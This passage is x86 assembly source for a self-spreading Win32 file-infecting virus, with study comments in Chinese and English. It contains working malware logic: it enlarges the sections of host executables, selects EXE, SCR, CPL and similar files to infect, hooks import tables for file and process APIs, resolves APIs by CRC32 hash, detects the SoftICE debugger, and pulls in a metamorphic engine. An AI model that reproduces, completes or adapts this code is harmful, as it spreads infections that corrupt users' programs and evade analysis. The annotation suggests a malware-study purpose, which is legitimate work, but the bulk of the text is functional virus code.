  or dword ptr [edi.SH_Characteristics], IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE
            ;set flags
  ;; 修改大小
  lea ecx, [edi.SH_VirtualSize]    ;get virtual size
  add [ecx], eax        ;correct it
  mov ecx, [esi.NT_OptionalHeader.OH_FileAlignment-4]
  xor edx, edx
  div ecx
  inc eax
  mul ecx
  mov edx, [edi.SH_SizeOfRawData]
  mov [edi.SH_SizeOfRawData], eax    ;align SizeOfRawData
  ;; 此节是初始化数据,如果是则重新设置
  test dword ptr [edi.SH_Characteristics], IMAGE_SCN_CNT_INITIALIZED_DATA
  je rs_ok
  sub eax, edx
  add [esi.NT_OptionalHeader.OH_SizeOfInitializedData-4], eax
            ;update next field, if needed
rs_ok:  mov eax, [edi.SH_VirtualAddress]
  add eax, [edi.SH_VirtualSize]
  xor edx, edx
  mov ecx, [esi.NT_OptionalHeader.OH_SectionAlignment-4]
  div ecx
  inc eax
  mul ecx
  ;; 设置 SizeOfImage
  mov [esi.NT_OptionalHeader.OH_SizeOfImage-4], eax  ;new SizeOfImage
  jmp endMapFile      ;everything is ok, we can quit

;; 此函数用于检测当前目标文件的大小,后缀名等是否符合感染条件
CheckFile:
  pushad
  mov ebx, esi
  test [ebx.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
  jne c_error        ;discard directory entries
  xor ecx, ecx
  cmp [ebx.WFD_nFileSizeHigh], ecx  ;discard files >4GB
  jne c_error
  mov edi, [ebx.WFD_nFileSizeLow]
  cmp edi, 4000h        ;discard small files
  jb c_error

  lea esi, [ebx.WFD_szFileName]    ;get filename
  push esi
endf:  lodsb
  cmp al, '.'        ;search for dot
  jne endf   
  dec esi
  lodsd          ;get filename extension
  or eax, 20202020h      ;make it lowercase
  not eax          ;mask it
  pop esi
  cmp eax, not 'exe.'      ;is it EXE?
  je extOK
  cmp eax, not 'rcs.'      ;is it SCR?
  je extOK
  cmp eax, not 'xfs.'      ;is it SFX?
  je extOK
  cmp eax, not 'lpc.'      ;is it CPL?
  je extOK
  cmp eax, not 'tad.'      ;is it DAT?
  je extOK
  cmp eax, not 'kab.'      ;is it BAK?
  je extOK
  xor ecx, ecx
  inc ecx
c_error:mov [esp.Pushad_ecx], ecx    ;save result
  popad
  ret
;; 如果是可以感染的文件则设置它的文件属性为 normal file
extOK:  push FILE_ATTRIBUTE_NORMAL    ;normal file
  push esi        ;filename
  mov eax, 0
ddSetFileAttributesA = dword ptr $-4
  call eax        ;blank file attributes
  xchg eax, ecx
  jmp c_error

;; 设置 VLCB 信号
;; 输入:ECX:0 则为设置数据并且等待,反之则为等待获取请求
;;       ESI:指向数据缓冲,如果 ECX 不等于 0
;;  EBX:请求的 ID 号
;;  EDX:如果是随机线程则为-1,其余的则为线程号
;; 输出:ECX:如果是输出入则 ECX 不等于,否则则为请求 ID 号
;;       如果出错为-1
;;       EDX:如果 ECX!=0,否则为线程号
;;       ESI:指向要设置的数据,如果输入 ECX=0
get_set_VLCB:    ;get/set VLCB records procedure (IPC)
      ;input:  ECX    -  0=set/wait else wait/get
      ;  ESI    -  pointer to data, if ECX!=0
      ;  EBX    -  ID number of request
      ;  EDX    -  -1, if random thread, otherwise
      ;     -  number of thread.
      ;output:ECX    -  if input ECX!=0, ECX=ID
      ;     -  if error, ECX=-1
      ;  EDX    -  if ECX!=0, number of thread
      ;  ESI    -  ptr to data, if input ECX=0
  mov edi, 0
vlcbBase = dword ptr $-4
  inc edx
  je t_rnd        ;get random record
  dec edx
  imul eax, edx, VLCB_TSize-8
  add edi, eax
  jecxz sw_VLCB
  cmp dword ptr [edi.VLCB_TSep.VLCB_THandle], 0
  je qq
  call w_wait        ;wait for free mutex
  pushad
  xchg esi, edi
  lea esi, [esi.VLCB_TSep.VLCB_TData]
  mov ecx, (VLCB_TSize-8)/4
  rep movsd        ;copy data
  popad
  mov ecx, [edi.VLCB_TSep.VLCB_TID]  ;get ID
  push ecx
  call r_mutex        ;release mutex
  pop ecx
  ret          ;and quit
t_next:  add edi, VLCB_TSize-8      ;move to next record
  inc edx
  loop tsrch
qqq:  pop ecx
qq:  xor ecx, ecx
  dec ecx
  ret
t_rnd:  push ecx        ;pass thru 20 records
  push 20
  pop ecx
  xor edx, edx
tsrch:  cmp dword ptr [edi.VLCB_TSep.VLCB_THandle], 0
  je t_next        ;check if its free
  pop ecx
sw_VLCB:call w_wait        ;wait for free mutex
  pushad
  lea edi, [edi.VLCB_TSep.VLCB_TData]
  mov ecx, (VLCB_TSize-8)/4
  rep movsd        ;copy data
  popad
  mov [edi.VLCB_TSep.VLCB_TID], ebx
  pushad
  lea esi, [edi.VLCB_TSep.VLCB_TData.WFD_szAlternateFileName]
  mov ebp, [esi]        ;get result
  call r_mutex        ;signalize mutex
slp:  call sleep        ;switch to next thread
  cmp [esi], ebp        ;check for change
  je slp          ;no change, wait
  popad
  xor ecx, ecx
  ret          ;quit
w_wait:  call open_mutex        ;open mutex
  push eax
  push 10000        ;wait 10 seconds
  push eax
  mov eax, 0
ddWaitForSingleObject = dword ptr $-4
  call eax
  test eax, eax
  pop eax
  jne qqq           ;quit if not signalized
  call close_mutex      ;close mutex
  ret          ;and quit
open_mutex:
  lea eax, [edi.VLCB_TSep.VLCB_THandle]  ;name of mutex
  push eax
  push 0
  push 0f0000h or 100000h or 1    ;access flags
  mov eax, 0
ddOpenMutexA = dword ptr $-4      ;open mutex
  call eax
  ret
r_mutex:call open_mutex        ;open mutex
  push eax
  push eax
  mov eax, 0
ddReleaseMutex = dword ptr $-4
  call eax        ;singalize mutex
  pop eax
close_mutex:
  push eax
  mov eax, 0
ddCloseHandle = dword ptr $-4
  call eax        ;close mutex
  ret
sleep:  push 0          ;switch to next thread
  mov eax, 0
ddSleep = dword ptr $-4
  call eax        ;switch!
  ret

;; 检查并且感染
Check&Infect:
  pushad
  mov esi, ebx        ;get ptr to data
  pushad
  call vlcb_stuph        ;common stuph
  mov ebx, VLCB_Check      ;check only
  call get_set_VLCB      ;IPC!
  inc ecx
  popad
  je _ret_        ;quit if error
  mov eax, dword ptr [esi.WFD_szAlternateFileName]
  dec eax
  test eax, eax
  je _ret_
sc1_ok:  call vlcb_stuph        ;common stuph
  mov ebx, VLCB_Infect      ;check and infect
  call get_set_VLCB      ;IPC!
_ret_:  popad
  ret

;; 计算 CRC32 值
;; CRC32 的算法在这里就不做分析了
CRC32:  push ecx        ;procedure to calculate  CRC32
  push edx
  push ebx        
        xor ecx, ecx    
        dec ecx         
        mov edx, ecx    
NextByteCRC:            
        xor eax, eax    
        xor ebx, ebx    
        lodsb           
        xor al, cl     
  mov cl, ch
  mov ch, dl
  mov dl, dh
  mov dh, 8
NextBitCRC:
  shr bx, 1
  rcr ax, 1
  jnc NoCRC
  xor ax, 08320h
  xor bx, 0edb8h
NoCRC:  dec dh
  jnz NextBitCRC
  xor ecx, eax
  xor edx, ebx
        dec edi
  jne NextByteCRC
  not edx
  not ecx
  pop ebx
  mov eax, edx
  rol eax, 16
  mov ax, cx
  pop edx
  pop ecx
  ret

;; 搜索引出表
SearchET:    ;procedure for recieving API names from Export table
  pushad          ;save all registers
  @SEH_SetupFrame <jmp address_not_found>  ;setup SEH frame
  mov edi, [eax.MZ_lfanew]    ;get ptr to PE header
  add edi, eax        ;make pointer raw
  mov ecx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
  jecxz address_not_found      ;quit, if no exports
  mov ebx, eax
  add ebx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
  mov edx, eax        ;get RVA to Export table
  add edx, [ebx.ED_AddressOfNames]  ;offset to names
  mov ecx, [ebx.ED_NumberOfNames]    ;number of name
  mov edi, esi
  push edi
  xchg eax, ebp
  xor eax, eax
APIname:push eax
  mov esi, ebp
  add esi, [edx+eax*4]      ;get to API name
  push esi
  @endsz          ;get to the end of API name
  sub esi, [esp]        ;get size of API name
  mov edi, esi        ;to EDI
  pop esi          ;restore ptr to API name
  call CRC32        ;get its CRC32
  mov edi, [esp+4]      ;get requested CRC32
  cmp eax, [edi]        ;is it same
  pop eax
  je mcrc          ;yeah
nchar:  inc eax          ;no, increment counter
  loop APIname        ;and get next API name
  pop eax          ;clean stack
address_not_found:
  xor eax, eax        ;and quit
  jmp endGPA
mcrc:  pop edx
  mov edx, ebp
  add edx, [ebx.ED_AddressOfOrdinals]  ;skip over ordinals
  movzx eax, word ptr [edx+eax*2]
  cmp eax, [ebx.ED_NumberOfFunctions]
  jae address_not_found
  mov edx, ebp
  add edx, [ebx.ED_AddressOfFunctions]  ;get start of function addresses
  add ebp, [edx+eax*4]      ;make it pointer to our API
  xchg eax, ebp        ;address to EAX
endGPA:  @SEH_RemoveFrame      ;remove SEH frame
  mov [esp.Pushad_eax], eax    ;store address
  popad          ;restore all registers
  ret          ;and quit

;; 计算对齐
a_go:  inc esi          ;jump over alignments
  inc esi
  pushad          ;store all registers
  xor edx, edx        ;zero EDX
  xchg eax, esi
  push 2
  pop ecx
  div ecx
  test edx, edx
  je end_align        ;no alignments needed
  inc eax          ;align API name
end_align:
  mul ecx
  mov [esp.Pushad_esi], eax
  popad          ;restore all registers
  ret

;; 对指定的函数进行引入表的 HOOK
PatchIT  Proc           ;procedure for patching API calls
  pushad          ;store all registers
  @SEH_SetupFrame <jmp endPIT>    ;setup SEH frame
  call itDlta
itDelta:db  0b8h
itDlta:  pop ebp
  mov [ebp + gmh - itDelta], eax    ;save it
  mov ebx, [eax.MZ_lfanew]    ;get to PE header
  add ebx, eax        ;make pointer raw
  push dword ptr [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
  call rva2raw
  pop edx
  sub edx, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
  push edi
n_dll:  pop edi
  add edx, IMAGE_SIZEOF_IMPORT_DESCRIPTOR
  lea edi, [ebp + szK32 - itDelta]  ;get Kernel32 name
  mov esi, [edx]
  test esi, esi
  je endPIT
sdll:  push dword ptr [edx.ID_Name]
  call rva2raw
  pop esi
  push edi
  cmpsd          ;is it K32?
  jne n_dll
  cmpsd
  jne n_dll
  cmpsd
  jne n_dll
  pop edi
  xor ecx, ecx        ;zero counter
  push dword ptr [edx.ID_OriginalFirstThunk]  ;get first record
  call rva2raw
  pop esi
  push dword ptr [esi]      ;get first API name
  call rva2raw
  pop esi
pit_align:
  call a_go
  push esi        ;store pointer
  @endsz          ;get to the end of API name
  mov edi, esi
  sub edi, [esp]        ;move size of API name to EDI
  pop esi          ;restore pointer
  push eax        ;store EAX
  call CRC32        ;calculate CRC32 of API name
  cmp eax, [esp.cPushad+10h]    ;check, if it is requested API
  je a_ok          ;yeah, it is
  inc ecx
  mov eax, [esi]        ;check, if there is next API
  test eax, eax        ;...
  pop eax          ;restore EAX
  jne pit_align        ;yeah, check it
  jmp endPIT        ;no, quit
a_ok:  pop eax          ;restore EAX
  push dword ptr [edx.ID_FirstThunk]  ;get address to IAT
  call rva2raw
  pop edx
  mov eax, [edx+ecx*4]      ;get address
  mov [esp.Pushad_eax+8], eax    ;and save it to stack
  pushad          ;store all registers
  mov eax, 0        ;get base address of program
gmh = dword ptr $-4
  mov ebx, [eax.MZ_lfanew]
  add ebx, eax        ;get PE header

  push dword ptr [ebx.NT_OptionalHeader.OH_BaseOfCode]  ;get base of code
  call rva2raw        ;normalize
  pop esi          ;to ESI
  mov ecx, [ebx.NT_OptionalHeader.OH_SizeOfCode]  ;and its size
  pushad
  call p_var
  dd  ?
p_var:  push PAGE_EXECUTE_READWRITE
  push ecx
  push esi
  mov eax, 0
ddVirtualProtect = dword ptr $-4
  call eax        ;set writable right
  test eax, eax
  popad
  je endPIT
sJMP:  mov dl, [esi]        ;get byte from code
  inc esi
  cmp dl, 0ffh        ;is it JMP/CALL?
  jne lJMP                    ;check, if it is           
  cmp byte ptr [esi], 25h            ;JMP DWORD PTR [XXXXXXXXh]
  je gIT1                             
  cmp byte ptr [esi], 15h      ;or CALL DWORD PTR [XXXXXXXXh]
  jne lJMP
  mov dl, 0e8h
  jmp gIT2
gIT1:  mov dl, 0e9h
gIT2:  mov [ebp + j_or_c - itDelta], dl  ;change opcode
  mov edi, [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
  add edi, [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_Size]
  push ecx
  mov ecx, [ebx.NT_OptionalHeader.OH_ImageBase]
  add edi, ecx
  push ebp
  mov ebp, [esi+1]
  sub ebp, ecx
  push ebp
  call rva2raw
  pop ebp
  sub ebp, eax
  add ebp, ecx
  sub edi, ebp
  pop ebp
  pop ecx
  js lJMP          ;check, if it is correct address
  push ecx
  push edx        ;store EDX
  mov edx, [esp.Pushad_ecx+8]    ;get counter
  imul edx, 4        ;multiply it by 4
  add edx, [esp.Pushad_edx+8]    ;add address to IAT to ptr
  sub edx, eax
  mov ecx, [esi+1]
  sub ecx, [ebx.NT_OptionalHeader.OH_ImageBase]
  push ecx
  call rva2raw
  pop ecx
  sub ecx, eax
  cmp edx, ecx        ;is it current address
  pop edx
  pop ecx          ;restore EDX
  jne sJMP        ;no, get next address
  mov eax, [esi+1]
  mov [esp.cPushad.Pushad_eax+8], eax  ;store register to stack
  mov [esp.Pushad_esi], esi    ;for l8r use
  popad          ;restore all registers

  mov byte ptr [esi-1], 0e9h    ;build JMP or CALL
j_or_c = byte ptr $-1
  mov ebx, [esi+1]
  mov eax, [esp.cPushad+10h]    ;get address
  add eax, [ebp + gmh - itDelta]
  sub eax, esi        ;- current address
  sub eax, 4        ;+1-5
  mov [esi], eax        ;store built jmp instruction
  mov byte ptr [esi+4], 90h
  xchg eax, ebx
  jmp endIT        ;and quit
lJMP:  dec ecx
  jecxz endPIT-1
  jmp sJMP        ;search in a loop
  popad          ;restore all registers
endPIT:  xor eax, eax
  mov [esp.Pushad_eax+8], eax
endIT:  @SEH_RemoveFrame      ;remove SEH frame
  popad          ;restore all registers
  ret 8          ;and quit
PatchIT  EndP

;; 将内存偏移转换为文件偏移
rva2raw:pushad      ;procedure for converting RVAs to RAW pointers
  mov ecx, 0        ;0 if actual program
r2rp = dword ptr $-4
  jecxz nr2r
  mov edx, [esp.cPushad+4]    ;no comments needed :)
  movzx ecx, word ptr [ebx.NT_FileHeader.FH_NumberOfSections]
  movzx esi, word ptr [ebx.NT_FileHeader.FH_SizeOfOptionalHeader]
  lea esi, [esi+ebx+IMAGE_SIZEOF_FILE_HEADER+4]
n_r2r:  mov edi, [esi.SH_VirtualAddress]
  add edi, [esi.SH_VirtualSize]
  cmp edx, edi
  jb c_r2r
  add esi, IMAGE_SIZEOF_SECTION_HEADER
  loop n_r2r
  popad
  ret
nr2r:  add [esp.cPushad+4], eax
  popad
  ret
c_r2r:  add eax, [esi.SH_PointerToRawData]
  add eax, edx
  sub eax, [esi.SH_VirtualAddress]
  mov [esp.cPushad+4], eax
  popad
  ret

;; 这条线程为了 HOOK 当前程序引入表
NewThread:          ;thread starts here
  pushad          ;store all registers
  ;; 发生异常则跳入到 q_hook 标签
  @SEH_SetupFrame <jmp q_hook>
  ;; 获取 API 偏移地址表的地址
  mov ebp, [esp+2ch]      ;get delta parameter
  xor ecx, ecx        ;zero ECX
  ;; 将要转换的偏移亲 0,这是一个自修改代码,再后面的地址转换
  ;; 函数中可以看到它要修改的地方
  and dword ptr [ebp + r2rp - gdelta], 0
  ;; eax 中保存着新函数地址的偏移表
g_hook:  mov eax, [ebp + newHookers + ecx*4 - gdelta]  ;take address to hooker
  test eax, eax        ;is it 0?
  ;; 如果为 0 则退出
  je q_hook        ;yeah, quit
  ;; eax 中为新的函数的地址
  add eax, ebp
  ;; eax 中为此到当前宿主应用程序 ImageBase 的偏移,GMHA 处存放着应用程序的加载地址
  sub eax, [ebp + GMHA - gdelta]
  ;; 将新函数偏移将要 HOOK 的 API 名字表地址一同压力堆栈
  push eax        ;store address
  push dword ptr [ebp + crchAPIs + ecx*4 - gdelta]  ;store CRC32
  ;; HOOK 引入表 eax 中将返回原始 API 的地址
  mov eax, 0
GMHA = dword ptr $-4
  call PatchIT        ;and patch Import Table
  mov esi, [ebp + oldHookers + ecx*4 - gdelta]
  add esi, ebp
  mov [esi], eax        ;save old hooker
  inc ecx          ;increment counter
  jmp g_hook        ;loop
q_hook:  @SEH_RemoveFrame
  popad          ;restore all registers
  ret          ;and terminate thread

;; BPE32 变形引擎
include BPE32.asm


szK32      db  'KERNEL32.dll',0  ;name of DLL
sice95      db  '\\.\SICE',0    ;SoftICE/95/98
siceNT      db  '\\.\NTICE',0    ;SoftICE/NT
;APIs needed at run-time
crcAPIs      dd  0AE17EBEFh    ;FindFirstFileA
      dd  0AA700106h    ;FindNextFileA
      dd  0C200BE21h    ;FindClose
      dd  03C19E536h    ;SetFileAttributesA
      dd  04B2A3E7Dh    ;SetFileTime
      dd  08C892DDFh    ;CreateFileA
      dd  096B2D96Ch    ;CreateFileMappingA
      dd  0797B49ECh    ;MapViewOfFile
      dd  094524B42h    ;UnmapViewOfFile
      dd  019F33607h    ;CreateThread
      dd  0D4540229h    ;WaitForSingleObject
      dd  068624A9Dh    ;CloseHandle
      dd  020B943E7h    ;CreateMutexA
      dd  0C449CF4Eh    ;ReleaseMutex
      dd  0C6F22166h    ;OpenMutexA
      dd  00AC136BAh    ;Sleep
      dd  079C3D4BBh    ;VirtualProtect
      dd  0EB1CE85Ch    ;GetCurrentProcessId
      dd  033D350C4h    ;OpenProcess
      dd  041A050AFh    ;TerminateProcess
      dd  04134D1ADh    ;LoadLibraryA
      dd  0FFC97C1Fh    ;GetProcAddress
      dd  0AFDF191Fh    ;FreeLibrary

;APIs to hook
crchAPIs    dd  0AE17EBEFh    ;FindFirstFileA
      dd  0AA700106h    ;FindNextFileA
      dd  05BD05DB1h    ;CopyFileA
      dd  0953F2B64h    ;CopyFileExA
      dd  08C892DDFh    ;CreateFileA
      dd  0267E0B05h    ;CreateProcessA
      dd  0DE256FDEh    ;DeleteFileA
      dd  0C633D3DEh    ;GetFileAttributesA
      dd  08F48B20Dh    ;GetFullPathNameA
      dd  0F2F886E3h    ;_lopen
      dd  02308923Fh    ;MoveFileA
      dd  03BE43958h    ;MoveFileExA
      dd  068D8FC46h    ;OpenFile
      dd  03C19E536h    ;SetFileAttributesA
      dd  028452C4Fh    ;WinExec
      dd  040F57181h    ;ExitProcess
      dd  0058F9201h    ;ExitThread
      dd  087D52C94h    ;GetLastError
      dd  068624A9Dh    ;CloseHandle

;APIs to patch
crcpAPIs    dd  0E141042Ah    ;GetProcessHeap
      dd  042F13D06h    ;GetVersion
      dd  0DE5C074Ch    ;GetVersionEx
      dd  052CA6A8Dh    ;GetStartupInfoA
      dd  04E52DF5Ah    ;GetStartupInfoW
         dd  03921BF03h    ;GetCommandLineA
      dd  025B90AD4h    ;GetCommandLineW
      dd  003690E66h    ;GetCurrentProcess
      dd  019F33607h    ;CreateThread
      dd  082B618D4h    ;GetModuleHandleA
      dd  09E2EAD03h    ;GetModuleHandleW
      dd  ?
virus_end:            ;end of virus in host

tmp      dd  ?      ;temporary variable
      org tmp        ;overlay
WFD    WIN32_FIND_DATA ?      ;Win32 Find Data
WFD2    WIN32_FIND_DATA ?      ;Win32 Find Data
data_buffer    db  256 dup (?)    ;buffer for VLCB_TData
size_unint = $ - virus_end        ;size of unitialized
         ;variables

;used only by first generation of virus
workspace1    db  16 dup (?)    ;usd by compression
workspace2    db  16 dup (?)    ;engine
_GetModuleHandleA  dd  offset GetModuleHandleA
ends           ;end of code section
End first_gen            ;end of virus

```
